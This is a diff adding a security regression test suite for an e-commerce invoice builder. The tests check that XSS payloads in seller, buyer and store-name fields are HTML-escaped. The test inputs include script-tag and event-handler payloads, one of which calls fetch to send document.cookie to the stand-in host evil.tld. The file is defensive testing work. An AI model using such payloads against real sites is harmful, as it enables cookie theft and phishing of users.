@@ -191,6 +191,111 @@ describe("invoice builders", () => {
   });
 });
 
+/**
+ * Phase 36 security regression.
+ *
+ * The invoice is sent to the buyer from the platform's own sending domain while
+ * the product title inside it is authored by the seller and the customer name by
+ * the buyer. Interpolated raw, a title like `<a href="…">مشاهده فاکتور</a>` puts
+ * a phishing link in a message the buyer has every reason to trust — the
+ * platform's branding is in the same email. This is the injection surface, so
+ * the tests below assert on the absence of markup, not merely on escaping
+ * "looking right" for one field.
+ */
+describe("invoice HTML injection defence (Phase 36)", () => {
+  const ORDER_BASE = {
+    orderNumber: 7,
+    subtotal: 120000,
+    shippingFee: 0,
+    discount: 0,
+    total: 120000,
+    status: "pending",
+    payment: { status: "paid" },
+    items: [{ title: "سفال", price: 120000, qty: 1 }],
+  };
+
+  it("escapes a script payload in the seller-authored product title", () => {
+    const html = buildInvoiceHtml({
+      ...ORDER_BASE,
+      customer: { name: "مشتری" },
+      sellerStoreName: "فروشگاه تست",
+      items: [{ title: '<script>alert("xss")</script>', price: 120000, qty: 1 }],
+    });
+    expect(html).not.toContain("<script>");
+    expect(html).not.toContain("</script>");
+    expect(html).toContain("&lt;script&gt;");
+  });
+
+  it("escapes a payload in the buyer's own name", () => {
+    const html = buildInvoiceHtml({
+      ...ORDER_BASE,
+      customer: { name: '<img src=x onerror="fetch("//evil.tld?c="+document.cookie)">' },
+      sellerStoreName: "فروشگاه تست",
+    });
+    // The property that matters is that no tag can be formed: every angle
+    // bracket is an entity, so `onerror=` can only ever be visible text in a
+    // text node, never an attribute of a live element.
+    expect(html).not.toMatch(/<img/i);
+    expect(html).toContain(
+      "&lt;img src=x onerror=&quot;fetch(&quot;//evil.tld?c=&quot;+document.cookie)&quot;&gt;",
+    );
+  });
+
+  it("escapes a payload in the store name", () => {
+    const html = buildInvoiceHtml({
+      ...ORDER_BASE,
+      customer: { name: "مشتری" },
+      sellerStoreName: '"><svg onload=alert(1)>',
+    });
+    expect(html).not.toMatch(/<svg/i);
+    expect(html).toContain("&lt;svg");
+  });
+
+  it("escapes quote and ampersand characters that would break attribute context", () => {
+    const html = buildInvoiceHtml({
+      ...ORDER_BASE,
+      customer: { name: '" onmouseover="alert(1)' },
+      sellerStoreName: "گالری & مبلمان <چرم>",
+    });
+    expect(html).not.toContain('onmouseover="alert(1)"');
+    expect(html).toContain("&amp;");
+    expect(html).toContain("&quot;");
+  });
+
+  it("keeps Persian text intact while escaping", () => {
+    const html = buildInvoiceHtml({
+      ...ORDER_BASE,
+      customer: { name: "مشتری" },
+      sellerStoreName: "گالری & مبلمان",
+      items: [{ title: "کاسه <سفالی>", price: 120000, qty: 1 }],
+    });
+    expect(html).toContain("کاسه &lt;سفالی&gt;");
+    expect(html).toContain("گالری &amp; مبلمان");
+    // Persian digits and separators must survive escaping — escaping is not
+    // allowed to mangle the amounts the buyer is meant to read.
+    expect(html).toContain("۱۲۰٬۰۰۰");
+  });
+
+  it("does not throw when the customer object is missing", () => {
+    // A crash here would be worse than an empty field: the invoice is sent from
+    // the same worker that the checkout callback awaits.
+    expect(() => buildInvoiceHtml({ ...ORDER_BASE, customer: undefined })).not.toThrow();
+  });
+
+  it("leaves the plain-text invoice as literal text, with no markup added", () => {
+    const text = buildInvoiceText({
+      ...ORDER_BASE,
+      customer: { name: "مشتری" },
+      sellerStoreName: "فروشگاه تست",
+      items: [{ title: "<script>alert(1)</script>", price: 120000, qty: 1 }],
+    });
+    // The text channel is not parsed as HTML, so the title stays verbatim and
+    // readable; nothing here should invent an escaping artefact into a message
+    // the buyer reads in a plain-text client.
+    expect(text).toContain("<script>alert(1)</script>");
+  });
+});
+
 describe("invoice email on payment SUCCESS", () => {
   it("emits a delivered invoice record after the SUCCESS callback", async () => {
     const order = await checkout();
